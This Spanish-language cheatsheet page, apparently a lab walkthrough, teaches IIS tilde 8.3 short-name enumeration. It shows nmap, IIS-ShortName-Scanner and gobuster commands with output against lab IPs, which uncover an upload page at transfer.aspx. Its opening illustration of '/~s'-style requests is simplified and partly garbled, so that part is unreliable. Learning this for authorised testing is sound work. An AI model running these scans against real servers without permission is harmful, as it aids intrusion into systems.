
# IIS Tilde - Enumeración

`IIS tilde directory enumeration` es una técnica que se utiliza para descubrir archivos, directorios y nombres de archivo cortos (también conocidos como `8.3 format`) ocultos en algunas versiones de servidores web de Microsoft Internet Information Services (IIS). Este método aprovecha una vulnerabilidad específica de IIS, que resulta de la forma en que administra los nombres de archivo cortos dentro de sus directorios.

Cuando se crea un archivo o una carpeta en un servidor IIS, Windows genera un nombre de archivo corto en formato .txt `8.3 format`, que consta de ocho caracteres para el nombre del archivo, un punto y tres caracteres para la extensión. Curiosamente, estos nombres de archivo cortos pueden otorgar acceso a sus archivos y carpetas correspondientes, incluso si estaban destinados a permanecer ocultos o inaccesibles.

El carácter tilde ( `~`), seguido de un número de secuencia, indica un nombre de archivo corto en una URL. Por lo tanto, si alguien determina el nombre de archivo corto de un archivo o carpeta, puede aprovechar el carácter tilde y el nombre de archivo corto en la URL para acceder a datos confidenciales o recursos ocultos.

La enumeración de directorios con tilde de IIS implica principalmente el envío de solicitudes HTTP al servidor con distintas combinaciones de caracteres en la URL para identificar nombres de archivo cortos válidos. Una vez que se detecta un nombre de archivo corto válido, esta información se puede utilizar para acceder al recurso relevante o enumerar más a fondo la estructura del directorio.

El proceso de enumeración comienza enviando solicitudes con varios caracteres después de la tilde:

Código: http

```http
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Supongamos que el servidor contiene un directorio oculto llamado SecretDocuments. Cuando se envía una solicitud a `http://example.com/~s`, el servidor responde con un `200 OK`código de estado, que revela un directorio con un nombre corto que comienza con "s". El proceso de enumeración continúa agregando más caracteres:

```http
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```

Para la solicitud `http://example.com/~se`, el servidor devuelve un `200 OK`código de estado y refina aún más el nombre corto a "se". Se envían solicitudes posteriores, como las siguientes:

```http
http://example.com/~sec
http://example.com/~sed
http://example.com/~see
...
```

El servidor entrega un `200 OK`código de estado para la solicitud `http://example.com/~sec`, limitando aún más el nombre corto a "sec".

Continuando con este procedimiento, el nombre corto `secret~1`finalmente se descubre cuando el servidor devuelve un `200 OK`código de estado para la solicitud `http://example.com/~secret`.

Una vez que se identifica el nombre corto `secret~1`, se puede realizar la enumeración de nombres de archivos específicos dentro de esa ruta, exponiendo potencialmente documentos confidenciales.

Por ejemplo, si se determina el nombre corto `secret~1`para el directorio oculto SecretDocuments, se puede acceder a los archivos de ese directorio enviando solicitudes como:

```http
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

La misma técnica de enumeración de directorios con tilde de IIS también puede detectar nombres de archivo cortos 8.3 para los archivos dentro del directorio. Después de obtener los nombres cortos, se puede acceder directamente a esos archivos utilizando los nombres cortos en las solicitudes.

```http
http://example.com/secret~1/somefi~1.txt
```

En los nombres de archivo cortos 8.3, como `somefi~1.txt`, el número "1" es un identificador único que distingue a los archivos con nombres similares dentro del mismo directorio. Los números que siguen a la tilde ( `~`) ayudan al sistema de archivos a diferenciar entre archivos que comparten similitudes en sus nombres, lo que garantiza que cada archivo tenga un nombre de archivo corto 8.3 distinto.

Por ejemplo, si dos archivos nombrados `somefile.txt`y `somefile1.txt`existen en el mismo directorio, sus nombres de archivo cortos 8.3 serían:

* `somefi~1.txt`para`somefile.txt`
* `somefi~2.txt`para`somefile1.txt`

***

## <mark style="color:purple;">Enumeración</mark>

La fase inicial implica mapear el objetivo y determinar qué servicios están operando en sus respectivos puertos.

### **Escaneo con Nmap**

```shell-session
afsh4ck@kali$ nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds

```

IIS 7.5 se ejecuta en el puerto 80. Ejecutar un ataque de enumeración de tilde en esta versión podría ser una opción viable.

### **Tilde Enumeration usando IIS ShortName Scanner**

Enviar solicitudes HTTP manualmente para cada letra del alfabeto puede ser un proceso tedioso. Afortunadamente, existe una herramienta llamada `IIS-ShortName-Scanner`que puede automatizar esta tarea. Puede encontrarla en GitHub en el siguiente enlace: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) . Para usarla `IIS-ShortName-Scanner`, deberá instalar Oracle Java en Pwnbox o en su máquina virtual local. Puede encontrar detalles en el siguiente enlace. [Cómo instalar Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

Cuando ejecute el siguiente comando, le solicitará un proxy, simplemente presione Enter para No.

```shell-session
afsh4ck@kali$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Al ejecutar la herramienta, descubre 2 directorios y 3 archivos. Sin embargo, el objetivo no permite `GET`el acceso a `http://10.129.204.231/TRANSF~1.ASP`, por lo que es necesario realizar un ataque de fuerza bruta para acceder al nombre del archivo restante.

### **Generar wordlist**

```shell-session
afsh4ck@kali$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Este comando combina `egrep` y `sed` para filtrar y modificar el contenido de los archivos de entrada, luego guarda los resultados en un nuevo archivo en el directorio `/tmp`.

<table data-header-hidden><thead><tr><th width="225"></th><th></th></tr></thead><tbody><tr><td><strong>Parte del comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>egrep -r ^transf</code></td><td>El comando <code>egrep</code> se utiliza para buscar líneas que contengan un patrón específico en los archivos de entrada. La flag <code>-r</code> indica una búsqueda recursiva a través de directorios. El patrón <code>^transf</code> coincide con cualquier línea que comience con "transf". La salida de este comando serán líneas que comiencen con "transf" junto con sus nombres de archivo de origen.</td></tr><tr><td><code>|</code></td><td>El símbolo de barra vertical (<code>|</code>) se utiliza para pasar la salida del primer comando (<code>egrep</code>) al segundo comando ( <code>sed</code>). En este caso, las líneas que comienzan con "transf" y sus nombres de archivo serán la entrada del comando <code>sed</code>.</td></tr><tr><td><code>sed 's/^[^:]*://'</code></td><td>El comando <code>sed</code> se utiliza para realizar una operación de búsqueda y reemplazo en su entrada (en este caso, la salida de <code>egrep</code>). La expresión <code>'s/^[^:]*://'</code> indica que <code>sed</code> debe buscar cualquier secuencia de caracteres al principio de una línea ( <code>^</code>) hasta los primeros dos puntos ( <code>:</code>), y reemplazarlos por nada (eliminando efectivamente el texto coincidente). El resultado serán las líneas que comiencen con "transf" pero sin los nombres de archivo ni los dos puntos.</td></tr><tr><td><code>> /tmp/list.txt</code></td><td>El símbolo mayor que (<code>></code>) se utiliza para redirigir la salida de todo el comando (es decir, las líneas modificadas) a un nuevo archivo llamado <code>/tmp/list.txt</code>.</td></tr></tbody></table>

### **Enumeración con Gobuster**

Una vez que haya creado la lista de palabras personalizada, puede usarla `gobuster`para enumerar todos los elementos del objetivo.

```shell-session
afsh4ck@kali$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```

A partir de la salida redactada, puede ver que `gobuster` ha identificado exitosamente un archivo `.aspx` como el nombre de archivo completo correspondiente al nombre corto descubierto previamente `TRANSF~1.ASP`.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.213.72
```

> ¿Cuál es el nombre de archivo .aspx que identificó Gobuster?

### Escaneo con Nmap

```bash
sudo nmap -v -sV -T5 10.129.213.72            

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Solo vemos abierto el puerto 80 `Microsoft IIS httpd 7.5`

### Generar wordlist

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

### Enumeración con Gobuster

```bash
gobuster dir -u http://10.129.213.72/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.213.72/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/transfer.aspx        (Status: 200) [Size: 941]
/transfer.aspx        (Status: 200) [Size: 941]
```

El archivo aspx que nos encuentra es: `transfer.aspx`

Al abrirlo en el navegador vemos que es una funcionalidad de subida de archivos que podríamos explotar fácilmente:

{% content-ref url="/pages/mGfWtpjz6bK02j8Vqh6T" %}
[Ataques de subida de archivos](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-de-subida-de-archivos.md)
{% endcontent-ref %}

<figure><img src="/files/Rr9smUzKYJp0OpkZtrUC" alt=""><figcaption></figcaption></figure>
